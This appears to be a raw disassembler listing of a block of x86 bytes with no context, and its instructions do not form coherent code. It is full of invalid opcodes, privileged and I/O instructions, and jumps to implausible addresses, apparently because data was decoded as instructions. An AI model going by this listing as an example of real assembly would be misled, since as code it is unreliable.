  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx-0x13be5c9],1
  420266:	in     eax,0x58
  420268:	add    DWORD PTR [eax],eax
  42026a:	inc    DWORD PTR [eax]
  42026c:	add    BYTE PTR [eax],al
  42026e:	jno    0x420229
  420270:	fs daa 
  420272:	(bad)  
  420273:	jne    0x42029f
  420275:	lods   eax,DWORD PTR ds:[esi]
  420276:	scas   al,BYTE PTR es:[edi]
  420277:	addr16 push ss
  420279:	out    dx,eax
  42027a:	mov    ebx,0x3f00a206
  42027f:	and    al,0x79
  420281:	jmp    0x27c18e8c
  420286:	mov    ah,0x7d
  420288:	xchg   ebp,eax
  420289:	mov    BYTE PTR [ebp-0x7f],al
  42028c:	and    BYTE PTR [esi],bl
  42028e:	cwd    
  420290:	push   edi
  420291:	int    0x68
  420293:	arpl   WORD PTR ds:0x748ae266,si
  420299:	ss or  eax,0x2e54ea1b
  42029f:	pop    ebx
  4202a0:	pop    eax
  4202a1:	sub    esi,eax
  4202a3:	or     eax,edx
  4202a5:	mov    ds:0x8a97d211,eax
  4202aa:	jp     0x420278
  4202ac:	sbb    ecx,edx
  4202ae:	pop    edi
  4202af:	mov    esi,0x2f7f9229
  4202b4:	fwait
  4202b5:	aad    0x36
  4202b7:	mov    eax,0xd0f5985a
  4202bc:	popf   
  4202bd:	push   ds
  4202be:	dec    edi
  4202bf:	add    bl,dh
  4202c1:	pop    ebx
  4202c2:	mov    edx,0x784c7fcd
  4202c7:	xchg   DWORD PTR [ebx],edx
  4202c9:	inc    edx
  4202ca:	and    al,0xa7
  4202cc:	sub    DWORD PTR ds:0xb5a2bb4,edi
  4202d2:	and    al,0x57
  4202d4:	xchg   edi,eax
  4202d5:	enter  0xc41d,0xec
  4202d9:	xor    dh,BYTE PTR [edx+edx*1-0x1f]
  4202dd:	jle    0x420347
  4202df:	stc    
  4202e0:	adc    al,0x3d
  4202e2:	pop    eax
  4202e3:	adc    BYTE PTR [eax-0x760a5165],bh
  4202e9:	jge    0x4202da
  4202eb:	xor    DWORD PTR [ecx+ebx*1+0x5],edi
  4202ef:	inc    edx
  4202f0:	pop    ebx
  4202f1:	cmp    bh,BYTE PTR [esi+0x4eb0d903]
  4202f7:	add    DWORD PTR [eax-0x703da8dc],esp
  4202fd:	adc    bl,cl
  4202ff:	and    BYTE PTR [ecx-0x13d79df1],ch
  420305:	test   DWORD PTR [ebx+0x7b248433],esp
  42030b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42030c:	xor    DWORD PTR ds:0x51737cba,eax
  420312:	test   eax,0xbad58740
  420317:	jmp    0x1454:0xb43c97af
  42031e:	data16 jbe 0x420399
  420321:	dec    edx
  420322:	adc    DWORD PTR [edx-0x7301a72e],ecx
  420328:	jle    0x4202e2
  42032a:	aam    0xf2
  42032c:	and    DWORD PTR [ecx-0x77148115],ecx
  420332:	sbb    al,0xcd
  420334:	int    0x9c
  420336:	xchg   ecx,eax
  420337:	add    BYTE PTR [esi+esi*1+0x5b22364b],dl
  42033e:	push   ds
  42033f:	sub    cl,al
  420341:	ss int3 
  420343:	shl    DWORD PTR [esi+0x445af25d],0x9f
  42034a:	aaa    
  42034b:	stos   BYTE PTR es:[edi],al
  42034c:	out    0x40,al
  42034e:	inc    ebx
  42034f:	mov    esi,ds
  420351:	pop    ebx
  420352:	or     esi,ebp
  420354:	andnps xmm0,xmm7
  420357:	pushf  
  420358:	add    bl,ch
  42035a:	inc    eax
  42035b:	out    0xed,al
  42035d:	(bad)  
  42035e:	sbb    al,0xe0
  420360:	sbb    al,BYTE PTR [ebx]
  420362:	sbb    DWORD PTR [ebp-0x3],eax
  420365:	add    DWORD PTR [ecx-0x31],edi
  420368:	mov    cl,0xaf
  42036a:	test   eax,0xf277
	...
  4203d3:	add    BYTE PTR [eax],al
  4203d5:	add    BYTE PTR [ecx+0x6],al
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	scas   al,BYTE PTR es:[edi]
  4203e3:	lea    esp,[edx-0x64]
  4203e6:	in     al,0x59
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	inc    DWORD PTR [eax]
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	or     al,0xec
  4203f0:	das    
  4203f1:	push   esp
  4203f2:	jmp    0x420401
  4203f4:	push   ss
  4203f5:	lods   eax,DWORD PTR ds:[esi]
  4203f6:	push   eax
  4203f7:	xor    ah,BYTE PTR [ebp+0x65]
  4203fa:	sbb    BYTE PTR [ebx],dh
  4203fc:	mov    bh,0x9b
  4203fe:	and    DWORD PTR [eax+ebp*4],ecx
  420401:	push   ebp
  420402:	shr    BYTE PTR [edi-0x77da3d0],cl
  420408:	pusha  
  420409:	xchg   DWORD PTR [ebx],ebp
  42040b:	mov    cl,0x25
  42040d:	mov    esi,0xd2827013
  420412:	ret    
  420413:	retf   0x9a3c
  420416:	cli    
  420417:	mov    esi,eax
  420419:	cs push esp
  42041b:	add    DWORD PTR [ebx],ebp
  42041d:	add    bh,BYTE PTR [ecx-0x1c37d653]
  420423:	iret   
  420424:	sbb    DWORD PTR [esi+0x3a],esp
  420427:	scas   eax,DWORD PTR es:[edi]
  420428:	mov    BYTE PTR [eax-0x65],dh
  42042b:	loop   0x420417
  42042d:	mov    al,ds:0xc46de097
  420432:	inc    esp
  420433:	and    al,0xe9
  420435:	push   0x7e
  420437:	push   eax
  420438:	inc    ebp
  420439:	jl     0x420423
  42043b:	inc    edx
  42043c:	test   al,0x11
  42043e:	leave  
  42043f:	inc    ebx
  420440:	mov    eax,ds:0xe696d5a8
  420445:	dec    ebx
  420446:	sbb    BYTE PTR [ecx+ecx*8-0x334fe04b],0xeb
  42044e:	popa   
  42044f:	fwait
  420450:	inc    eax
  420452:	mov    ds:0x88c81458,al
  420457:	call   0x4d7176e2
  42045c:	outs   dx,BYTE PTR ds:[esi]
  42045d:	loop   0x4203ff
  42045f:	mov    cs,ebp
  420461:	inc    esp
  420462:	hlt    
  420463:	inc    BYTE PTR [edi+0x70]
  420466:	inc    edx
  420467:	inc    ebp
  420468:	and    eax,0x435870ae
  42046d:	stos   DWORD PTR es:[edi],eax
  42046e:	jns    0x4204c9
  420470:	jle    0x420404
  420472:	dec    edi
  420473:	inc    ebp
  420474:	outs   dx,DWORD PTR ds:[esi]
  420475:	or     BYTE PTR [esi+0x6d629687],0x15
  42047c:	imul   ebx,ebp,0xffffffb1
  42047f:	xchg   ecx,eax
  420480:	jmp    0x4204fa
  420482:	les    ebp,FWORD PTR [esi-0x19]
  420485:	call   DWORD PTR gs:0x504356e8
  42048c:	adc    edi,DWORD PTR [esp+edi*1]
  42048f:	imul   ebp,DWORD PTR [edx+0x73],0x93201e4d
  420496:	dec    ecx
  420497:	loop   0x42043f
  420499:	and    bh,dl
  42049b:	shl    edi,1
  42049d:	sub    al,0x41
  42049f:	pushf  
  4204a0:	fnstcw WORD PTR [eax+0x27]
  4204a3:	xor    cl,BYTE PTR [esi+edx*2-0x70]
  4204a7:	addr16 mov ?,ecx
  4204aa:	dec    ebx
  4204ab:	fcom   st(7)
  4204ad:	(bad)  
  4204af:	mov    ds,WORD PTR [ebx+0x41]
  4204b2:	inc    ecx
  4204b3:	fdivr  DWORD PTR [ecx+0x7cefb30d]
  4204b9:	sar    DWORD PTR [ecx-0x39],1
  4204bc:	int    0x1f
  4204be:	xor    eax,0x9f066adc
  4204c3:	inc    edx
  4204c4:	xchg   ax,ax
  4204c6:	outs   dx,BYTE PTR ds:[esi]
  4204c7:	(bad)  
  4204c9:	mov    ds:0x505732c7,eax
  4204ce:	ss inc esi
  4204d0:	xor    DWORD PTR [esi+0x15],edi
  4204d3:	xchg   esi,eax
  4204d4:	mov    eax,ds:0xe267f2a3
  4204d9:	jno    0x42052d
  4204db:	or     dl,bl
  4204dd:	sbb    eax,0x3e8f1395
  4204e2:	lahf   
  4204e3:	jmp    0xd384:0xcd260190
  4204ea:	dec    edx
  4204eb:	in     al,dx
  4204ec:	sub    al,0x0
	...
  420556:	scas   al,BYTE PTR es:[edi]
  420557:	xchg   esp,eax
  420558:	push   edi
  420559:	adc    bh,BYTE PTR [edi-0x2d]
  42055c:	out    dx,eax
  42055d:	mov    esp,0x5a7f6c39
  420562:	jp     0x4205c8
  420564:	(bad)  
  420566:	jecxz  0x4205c2
  420568:	add    DWORD PTR [eax],eax
  42056a:	inc    DWORD PTR [eax]
  42056c:	add    BYTE PTR [eax],al
  42056e:	jmp    0x30b43f23
  420573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420574:	dec    esi
  420575:	xor    BYTE PTR [edx-0x4b],cl
  420578:	ja     0x420545
  42057a:	mov    ch,BYTE PTR [ecx-0x2d264da3]
  420580:	mov    ecx,0x21f1f4df
  420585:	call   0x207719c4
  42058a:	xor    ebx,DWORD PTR [edx+0x60]
  42058d:	call   0x171309b6
  420592:	nop
  420593:	dec    esi
  420594:	fldcw  WORD PTR [ebx-0x22]
  420597:	dec    eax
  420598:	sub    ecx,DWORD PTR [eax-0x15]
  42059b:	les    ecx,FWORD PTR [ebx+0x6b]
  42059e:	or     cl,BYTE PTR [ebp-0x7c495e82]
  4205a4:	add    al,BYTE PTR [esi]
  4205a6:	mov    bh,0xd8
  4205a8:	aas    
  4205a9:	mov    ecx,0xe22d6761
  4205ae:	repz xchg edi,eax
  4205b0:	cld    
  4205b1:	lock retf 
  4205b3:	out    dx,eax
  4205b4:	das    
  4205b5:	call   0xa30a:0xc9d0e1df
  4205bc:	or     BYTE PTR ds:0x8a63b075,bh
  4205c2:	fwait
  4205c3:	dec    ebp
  4205c4:	sahf   
  4205c5:	sbb    eax,0xd9704a60
  4205ca:	sbb    BYTE PTR [ebx-0x3d],0x7e
  4205ce:	mov    bh,0x2f
  4205d0:	out    0x54,eax
  4205d2:	cli    
  4205d3:	dec    ebp
  4205d4:	xor    BYTE PTR [edx],bh
  4205d6:	xlat   BYTE PTR ds:[ebx]
  4205d7:	fisub  WORD PTR [edi+esi*8]
  4205da:	push   cs
  4205db:	cmp    al,0xb5
  4205dd:	or     DWORD PTR [ebx+0x1e71bb6b],eax
  4205e3:	inc    esp
  4205e4:	pushf  
  4205e5:	or     al,dh
  4205e7:	and    eax,0x3b774700
  4205ec:	mov    bp,0x8c07
  4205f0:	sti    
  4205f1:	ror    ebx,0x73
  4205f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205f5:	pop    edx
  4205f6:	pop    edi
  4205f7:	adc    ah,al
  4205f9:	mov    dh,0xe7
  4205fb:	mov    WORD PTR [eax+0x6e203bbb],cs
  420601:	test   eax,0xa55769eb
  420606:	std    
  420607:	ret    
  420608:	xchg   ecx,eax
  420609:	pop    esi
  42060a:	sub    DWORD PTR [ebp+0x15d96d74],ecx
  420610:	jl     0x42059f
  420612:	inc    esi
  420613:	push   0xffffffca
  420615:	icebp  
  420616:	mov    cl,0x33
  420618:	mov    ebx,0xbecc6f48
  42061d:	ret    0x5005
  420620:	mov    ch,0xe
  420622:	add    al,0x3c
  420624:	retf   
  420625:	and    edi,ebx
  420627:	inc    edx
  420628:	mov    ebp,0xa5f89a25
  42062d:	add    al,0x42
  42062f:	stos   BYTE PTR es:[edi],al
  420630:	cmp    dl,BYTE PTR [ebx*4+0x557c0c20]
  420637:	jle    0x42060e
  420639:	repnz dec edx
  42063b:	inc    esp
  42063c:	loop   0x420639
  42063e:	mov    edx,0x33fe0375
  420643:	dec    esp
  420644:	arpl   WORD PTR [eax+ebx*2-0x4e1272b1],dx
  42064b:	mov    eax,DWORD PTR [esi+0x2f]
  42064e:	jo     0x42065e
  420650:	xchg   ebp,eax
  420651:	mov    bh,0xb
  420653:	or     DWORD PTR [ebx-0x3f],eax
  420656:	add    al,0xad
  420658:	sub    edi,DWORD PTR [esi]
  42065a:	imul   ecx,DWORD PTR [ecx-0x1a],0x31ad91df
  420661:	and    ecx,DWORD PTR [edx]
  420663:	mov    ds:0x72d88f3f,eax
  420668:	adc    DWORD PTR [edi+0x1687b9],edx
	...
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	in     eax,0x91
  4206e4:	scas   al,BYTE PTR es:[edi]
  4206e5:	mov    edi,0x15be2
  4206ea:	inc    DWORD PTR [eax]
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	in     al,dx
  4206ef:	loop   0x4206ce
  4206f1:	sub    DWORD PTR [ecx],ecx
  4206f3:	imul   esp,DWORD PTR [ebx+0x7b9fedf6],0x45bee9a0
  4206fd:	(bad)  
  4206fe:	in     eax,0xbb
  420700:	adc    esi,DWORD PTR [esi]
  420702:	adc    ebx,DWORD PTR [ebx]
  420704:	jp     0x420781
  420706:	jae    0x420748
  420708:	std    
  420709:	mov    al,ds:0xb1e3f0d6
  42070e:	pop    ecx
  42070f:	sub    BYTE PTR [esi+0x142626ee],0xde
  420716:	add    BYTE PTR [ecx+0x48],cl
  420719:	push   ss
  42071a:	mov    ds,WORD PTR [esp+eiz*2+0x3b]
  42071e:	and    ecx,ecx
  420720:	sbb    DWORD PTR [ebx+0x7a],esp
  420723:	add    eax,0x63d1b500
  420728:	inc    esi
  420729:	add    eax,0xa43304da
  42072e:	adc    al,0x95
  420730:	inc    esp
  420731:	or     cl,cl
  420733:	adc    ch,dh
  420735:	mov    cl,0x3e
  420737:	iret   
  420738:	pushf  
  420739:	push   ds
  42073a:	(bad)  
  42073b:	mov    ebp,0x63346a59
  420740:	jb     0x4207a0
  420742:	in     eax,dx
  420743:	push   ds
  420744:	push   0x188336e7
  420749:	daa    
  42074a:	stos   DWORD PTR es:[edi],eax
  42074b:	xor    al,0x81
  42074d:	cmp    al,0xa2
  42074f:	je     0x420779
  420751:	mov    dh,0xbe
  420753:	inc    DWORD PTR [esi+0x63239b5e]
  420759:	cmp    ah,BYTE PTR [edx]
  42075b:	push   ebx
  42075c:	fisttp DWORD PTR [esi+eiz*1+0x3a]
  420760:	adc    ebx,DWORD PTR [ebx-0x3c]
  420763:	retf   
  420764:	cmp    cl,dh
  420766:	test   eax,0xbb4ca792
  42076b:	fldenv [esi]
  42076d:	mov    ecx,ebp
  42076f:	stc    
  420770:	fucomp st(0)
  420772:	in     al,dx
  420773:	shr    BYTE PTR [ebx-0x43],1
  420776:	inc    esi
  420777:	jmp    0x422b:0x1c72df66
  42077e:	push   esp
  42077f:	sbb    ebp,DWORD PTR [ebp+0x1670f06b]
  420785:	mov    bh,0x1e
  420787:	pop    ebx
  420788:	shr    DWORD PTR [eax],cl
  42078a:	loopne 0x4207c1
  42078c:	out    dx,al
  42078d:	mov    eax,ds:0xaad6a613
  420792:	jae    0x4207c5
  420794:	jge    0x4207db
  420796:	inc    ebx
  420797:	cs mov esi,0xdd959204
  42079d:	or     bl,dh
  42079f:	adc    al,0x87
  4207a1:	neg    BYTE PTR [ebx-0x793bca9]
  4207a7:	xchg   DWORD PTR [ecx-0xc894e25],esi
  4207ad:	into   
  4207ae:	or     al,0x3b
  4207b0:	xchg   ebp,eax
  4207b1:	pop    ecx
  4207b2:	mul    BYTE PTR [edi]
  4207b4:	sbb    DWORD PTR gs:[ebp-0x7162c3fa],ebx
  4207bb:	retf   0x5040
  4207be:	mov    ebx,0x8c113178
  4207c3:	lahf   
  4207c4:	sbb    edi,DWORD PTR [ebx-0x33afdc04]
  4207ca:	popf   
  4207cb:	xchg   edi,eax
  4207cc:	ins    DWORD PTR es:[edi],dx
  4207cd:	add    eax,0x872ffcec
  4207d2:	inc    ebx
  4207d3:	push   ss
  4207d4:	jp     0x4207d3
  4207d6:	(bad)  
  4207d8:	cmp    ebp,ecx
  4207da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207db:	sub    DWORD PTR [ebx],esp
  4207dd:	xchg   BYTE PTR [ebx+0x32],dl
  4207e0:	sub    eax,0xe756de8e
  4207e5:	(bad)  [ebx]
  4207e7:	les    esi,FWORD PTR [eax-0x49]
  4207ea:	inc    DWORD PTR [esi+0x38]
	...
  420854:	add    BYTE PTR [eax],al
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	mov    esp,0xe1778397
  420867:	pop    esp
  420868:	add    DWORD PTR [eax],eax
  42086a:	inc    DWORD PTR [eax]
  42086c:	add    BYTE PTR [eax],al
  42086e:	dec    edx
  42086f:	std    
  420870:	dec    BYTE PTR [ecx+0x9]
  420873:	pop    ebp
  420874:	push   ebx
  420875:	retf   0x91fc
  420878:	jno    0x4208c6
  42087a:	aad    0xf4
  42087c:	pop    esp
  42087d:	add    al,BYTE PTR [esp+esi*4+0x376a260d]
  420884:	mov    ebp,ebp
  420886:	sbb    eax,0xf0dd200e
  42088b:	pusha  
  42088c:	xchg   ebp,eax
  42088d:	add    edx,ebx
  42088f:	icebp  
  420890:	push   0x9f401357
  420895:	imul   DWORD PTR [ecx+0x68]
  420898:	xlat   BYTE PTR ds:[ebx]
  420899:	(bad)  
  42089a:	adc    ch,BYTE PTR [eax-0x51]
  42089d:	and    al,al
  42089f:	mov    eax,0x120a6f59
  4208a4:	inc    edi
  4208a5:	inc    ecx
  4208a6:	pop    edx
  4208a7:	shl    BYTE PTR [edx+edx*4-0x28],0xd3
  4208ac:	ds jo  0x42085a
  4208af:	sbb    al,0xa5
  4208b1:	mov    WORD PTR [eax],ds
  4208b3:	outs   dx,DWORD PTR ds:[esi]
  4208b4:	lods   al,BYTE PTR ds:[esi]
  4208b5:	sbb    ebx,DWORD PTR [edi+eax*1]
  4208b8:	ror    DWORD PTR [esi+eax*2],1
  4208bb:	retf   
  4208bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208bd:	mov    ebp,edx
  4208bf:	mov    ds,WORD PTR [eax-0x61]
  4208c2:	stc    
  4208c3:	xchg   esp,eax
  4208c4:	dec    ebx
  4208c5:	stos   DWORD PTR es:[edi],eax
  4208c6:	pop    ds
  4208c7:	cs cmp edx,0x25
  4208cb:	jbe    0x42085b
  4208cd:	retf   
  4208ce:	loopne 0x4208e5
  4208d0:	fld    QWORD PTR [edi+0x4d]
  4208d3:	es pop ecx
  4208d5:	cmp    ebx,DWORD PTR [eax-0x73]
  4208d8:	pop    ebx
  4208d9:	cmp    al,0xd9
  4208db:	and    eax,0x2401b69d
  4208e0:	push   cs
  4208e1:	out    0xa9,eax
  4208e3:	mov    edx,0xf1f87098
  4208e8:	lock push 0xffffffc7
  4208eb:	daa    
  4208ec:	adc    edi,ebp
  4208ee:	cmp    al,0xce
  4208f0:	jb     0xbd7deef8
  4208f6:	xchg   DWORD PTR [edx+0x56a0e06b],ecx
  4208fc:	sbb    DWORD PTR [edx-0x7e],ebp
  4208ff:	std    
  420900:	jmp    0x420888
  420902:	adc    ch,BYTE PTR [edx+ebp*1]
  420905:	and    esp,DWORD PTR [ecx]
  420907:	out    dx,al
  420908:	mov    esi,0xab0151eb
  42090d:	cmp    eax,0x39a4817e
  420912:	and    ch,BYTE PTR [ebp+0x613b3eb2]
  420918:	mov    al,0x4
  42091a:	dec    edi
  42091b:	push   ebp
  42091c:	leave  
  42091d:	leave  
  42091e:	ss lock stc 
  420921:	scas   eax,DWORD PTR es:[edi]
  420922:	add    BYTE PTR [ecx],al
  420924:	or     ebp,edx
  420926:	rol    DWORD PTR [edi+0x4770b72e],1
  42092c:	adc    edx,eax
  42092e:	mov    esi,0x523dc3a0
  420933:	mov    dl,ch
  420935:	pushf  
  420936:	fcom   DWORD PTR [ebx-0xcf47ee1]
  42093c:	push   0xffffff89
  42093e:	xor    BYTE PTR [ecx-0x45],bl
  420941:	inc    eax
  420942:	cmp    DWORD PTR [edi-0x47e916fe],esi
  420948:	je     0x4208fa
  42094a:	pop    esp
  42094b:	addr16 dec ebx
  42094d:	cmp    BYTE PTR [esi],0xc0
  420950:	mov    ?,esi
  420952:	xor    eax,esp
  420954:	pop    DWORD PTR [esi-0x27]
  420957:	pushf  
  420958:	push   0xfeb746df
  42095d:	and    eax,0x9ac629f8
  420962:	stos   BYTE PTR es:[edi],al
  420963:	cmc    
  420964:	adc    eax,0x974ce324
  420969:	pushf  
  42096a:	stos   DWORD PTR es:[edi],eax
  42096b:	or     DWORD PTR [ecx+0x0],esp
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0xc2
  4209e3:	push   ebp
  4209e4:	movlhps xmm4,xmm0
  4209e7:	pop    ebp
  4209e8:	add    DWORD PTR [eax],eax
  4209ea:	inc    DWORD PTR [eax]
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	mov    al,ds:0xf3e49201
  4209f3:	add    dh,BYTE PTR [esi-0x56d54262]
  4209f9:	or     esi,ecx
  4209fb:	repnz imul edi,DWORD PTR [edi-0x50707a0a],0x5
  420a03:	repnz mov al,ds:0x62040688
  420a09:	push   eax
  420a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a0b:	ja     0x4209c8
  420a0d:	pushf  
  420a0e:	inc    eax
  420a0f:	out    0xf7,eax
  420a11:	loopne 0x4209d4
  420a13:	arpl   dx,dx
  420a15:	(bad)  
  420a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a17:	data16 fs sub al,0xc7
  420a1b:	outs   dx,BYTE PTR ds:[esi]
  420a1c:	pop    esp
  420a1d:	daa    
  420a1e:	sub    dl,BYTE PTR [ebx]
  420a20:	push   0xffffff9b
  420a22:	sar    ch,cl
  420a24:	push   ebp
  420a25:	ins    BYTE PTR es:[edi],dx
  420a26:	sub    esp,ebp
  420a28:	or     DWORD PTR [esi+0x6b16db59],eax
  420a2e:	fimul  WORD PTR [esp+esi*2-0x3489a912]
  420a35:	les    ebp,FWORD PTR [eax]
  420a37:	in     al,dx
  420a38:	fwait
  420a39:	(bad)  
  420a3a:	aas    
  420a3b:	mov    edx,0x33cf73b6
  420a40:	rol    DWORD PTR [edx-0x1],cl
  420a43:	push   ebx
  420a44:	or     DWORD PTR [edx+0x6bbcc560],ebp
  420a4a:	xchg   esp,eax
  420a4b:	fnstenv [ebp-0x75]
  420a4e:	enter  0xab7d,0x19
  420a52:	cmp    al,0xcc
  420a54:	pusha  
  420a55:	pop    ebp
  420a56:	sub    BYTE PTR [ebx+0x3a655b17],0xbd
  420a5d:	mov    eax,ds:0x19e5f473
  420a62:	xor    edx,eax
  420a64:	push   ds
  420a65:	repz mov ah,0x7
  420a68:	push   ds
  420a69:	fdivr  st(4),st
  420a6b:	or     eax,ebp
  420a6d:	cdq    
  420a6e:	cld    
  420a6f:	mov    cl,0xe7
  420a71:	adc    ah,BYTE PTR [ecx+0x4d1c031a]
  420a77:	das    
  420a78:	mov    esi,0x1dde2c02
  420a7d:	jle    0x420ab3
  420a7f:	sub    BYTE PTR [ebp-0x6d6321b3],ch
  420a85:	add    edx,eax
  420a87:	sti    
  420a88:	sub    al,BYTE PTR ss:[ebx+eax*1+0x53]
  420a8d:	or     eax,0xa92ed8c9
  420a92:	xor    dl,0xcf
  420a95:	mov    al,0x8e
  420a97:	lahf   
  420a98:	mov    bl,0xa5
  420a9a:	mov    ebx,0x2f411791
  420a9f:	popf   
  420aa0:	mov    al,ds:0x30a4746d
  420aa5:	push   esp
  420aa6:	cmp    al,0x17
  420aa8:	mov    ds:0x7a6ba452,al
  420aad:	js     0x420aa1
  420aaf:	mov    edi,0x30c4e97d
  420ab4:	iret   
  420ab5:	test   DWORD PTR [ebx],ecx
  420ab7:	add    BYTE PTR [eax],0x15
  420aba:	pop    es
  420abb:	sub    al,0xe3
  420abd:	xor    cl,BYTE PTR [edx+0x20]
  420ac0:	fcomp  st(7)
  420ac2:	ror    DWORD PTR ds:0x33d3f061,cl
  420ac8:	test   BYTE PTR [edx+0x2a],ch
  420acb:	ror    DWORD PTR [eax],0x5c
  420ace:	mov    DWORD PTR [eax+0x75d9bf35],edi
  420ad4:	cmp    BYTE PTR [eax],dl
  420ad6:	cmp    al,0x9b
  420ad8:	loop   0x420ae4
  420ada:	dec    eax
  420adb:	xor    edx,ebx
  420add:	(bad)  
  420ade:	xor    BYTE PTR [edx-0xa9dc09d],al
  420ae4:	nop
  420ae5:	lahf   
  420ae6:	test   eax,0x2dc239e7
  420aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aec:	push   ecx
	...
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	daa    
  420b63:	mov    ebx,ebp
  420b65:	and    eax,0x15edf
  420b6a:	inc    DWORD PTR [eax]
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	push   eax
  420b6f:	mov    edi,0xdbda1961
  420b74:	pop    es
  420b75:	push   ss
  420b76:	pop    ecx
  420b77:	cmp    al,0x3
  420b79:	cmp    DWORD PTR [ebx+0x43],0x46ef74a0
  420b80:	xor    bl,BYTE PTR [edx-0x71]
  420b83:	sbb    BYTE PTR [eax+0x41],ah
  420b86:	xor    ch,BYTE PTR [edx-0x34cb1a15]
  420b8c:	cmp    bl,BYTE PTR [eax+0x505d0d69]
  420b92:	test   BYTE PTR [esi+0x43],ah
  420b95:	cmp    edx,DWORD PTR ds:0x82e19cfd
  420b9b:	bound  edi,QWORD PTR [edx]
  420b9d:	cwde   
  420b9e:	test   eax,0x90b822b7
  420ba3:	(bad)  [edi+0x1e]
  420ba6:	bound  esp,QWORD PTR [ebp+0x409b94d6]
  420bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bad:	lock (bad) 
  420baf:	jne    0x420c29
  420bb1:	shl    esi,0xd9
  420bb4:	je     0x420c1b
  420bb6:	cmp    bl,bl
  420bb8:	adc    BYTE PTR [ecx-0x4f54c9b6],0x30
  420bbf:	outs   dx,BYTE PTR ds:[esi]
  420bc0:	pusha  
  420bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bc2:	push   ebx
  420bc3:	(bad)  
  420bc5:	cmp    esi,DWORD PTR [ebx-0x66a8f62e]
  420bcb:	pop    eax
  420bcc:	inc    esp
  420bcd:	mov    WORD PTR [ebp+ebx*2+0x79],ss
  420bd1:	xchg   esi,eax
  420bd2:	sti    
  420bd3:	stos   BYTE PTR es:[edi],al
  420bd4:	xchg   ebx,eax
  420bd5:	xchg   esi,eax
  420bd6:	dec    edi
  420bd7:	das    
  420bd8:	inc    edx
  420bd9:	out    0xff,al
  420bdb:	out    dx,al
  420bdc:	stos   DWORD PTR es:[edi],eax
  420bdd:	sar    BYTE PTR [ecx+edx*2-0x46],0x4a
  420be2:	out    0xd8,eax
  420be4:	test   BYTE PTR [eax-0x62],0x90
  420be8:	stos   DWORD PTR es:[edi],eax
  420be9:	mov    eax,ds:0x8d8be7eb
  420bee:	jl     0x420c0a
  420bf0:	xchg   edi,eax
  420bf1:	xor    bh,BYTE PTR [edi]
  420bf3:	push   ecx
  420bf4:	aaa    
  420bf5:	xchg   DWORD PTR [eax],edi
  420bf7:	ins    DWORD PTR es:[edi],dx
  420bf8:	or     BYTE PTR [edx-0x27],ah
  420bfb:	xor    eax,0x14b83dfc
  420c00:	push   cs
  420c01:	jae    0x420c5d
  420c03:	jg     0x420c33
  420c05:	scas   al,BYTE PTR es:[edi]
  420c06:	mov    edx,0x27900602
  420c0b:	sbb    dh,dl
  420c0d:	cwde   
  420c0e:	in     al,0xaf
  420c10:	and    BYTE PTR [esi+0xb],0x25
  420c14:	xchg   esp,eax
  420c15:	mov    DWORD PTR [ebx+esi*1-0x27f7164f],ecx
  420c1c:	cld    
  420c1d:	scas   al,BYTE PTR es:[edi]
  420c1e:	cmp    cl,dl
  420c20:	sbb    al,0x4a
  420c22:	sahf   
  420c23:	imul   BYTE PTR [ecx+0x5b]
  420c26:	(bad)  
  420c28:	test   edx,edi
  420c2a:	in     al,0x37
  420c2c:	pop    esi
  420c2d:	int    0xca
  420c2f:	and    cl,BYTE PTR [edx]
  420c31:	aas    
  420c32:	mov    eax,ds:0x4ce142ca
  420c37:	rcr    dl,1
  420c39:	ret    
  420c3a:	inc    eax
  420c3b:	cmp    BYTE PTR [ecx],0x96
  420c3e:	sbb    eax,0x3f23dc08
  420c43:	aaa    
  420c44:	jae    0x420bdc
  420c46:	retf   0xe387
  420c49:	xor    DWORD PTR [ebp+0x5d],ebx
  420c4c:	jge    0x420c4a
  420c4e:	loop   0x420c06
  420c50:	inc    esi
  420c51:	ja     0x420c1a
  420c53:	inc    eax
  420c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c55:	jb     0x420c95
  420c57:	adc    al,0xa1
  420c59:	ins    DWORD PTR es:[edi],dx
  420c5a:	xor    cl,bh
  420c5c:	ret    0xa95a
  420c5f:	pop    ebx
  420c60:	and    eax,0x19319407
  420c65:	stos   BYTE PTR es:[edi],al
  420c66:	in     al,dx
  420c67:	mov    ebp,0x42af5fa8
  420c6c:	jp     0x420c6e
	...
  420cd6:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420cdc:	mov    edx,0x1886e3f
  420ce1:	in     eax,0xb6
  420ce3:	push   ecx
  420ce4:	jle    0x420c8a
  420ce6:	ficomp WORD PTR [edi+0x1]
  420ce9:	add    bh,bh
